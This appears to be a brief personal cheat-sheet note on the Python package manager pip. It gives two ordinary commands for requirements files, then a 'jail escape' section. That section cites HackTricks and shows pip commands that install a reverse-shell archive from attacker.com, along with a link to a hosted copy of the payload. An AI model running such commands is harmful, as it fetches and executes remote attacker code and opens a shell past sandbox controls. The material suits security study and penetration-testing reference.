---
tags:
  - python
---
A python package manager and library to add new python packages.
# Install From file
`pip install -r requirements.txt`
# Freeze Current packages into file
`pip freeze >> requirements.txt`
# Escaping Jail
https://book.hacktricks.xyz/generic-methodologies-and-resources/python/bypass-python-sandboxes
```python
pip install http://attacker.com/Reverse.tar.gz
pip.main(["install", "http://attacker.com/Reverse.tar.gz"])
```
Reverse.tar.gz is here:
https://129538173-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2F-L_2uGJGU7AVNRcqRvEi%2Fuploads%2Fgit-blob-3d8a632065b3179ece5bc038025f8126ced8f256%2FReverse.tar.gz?alt=media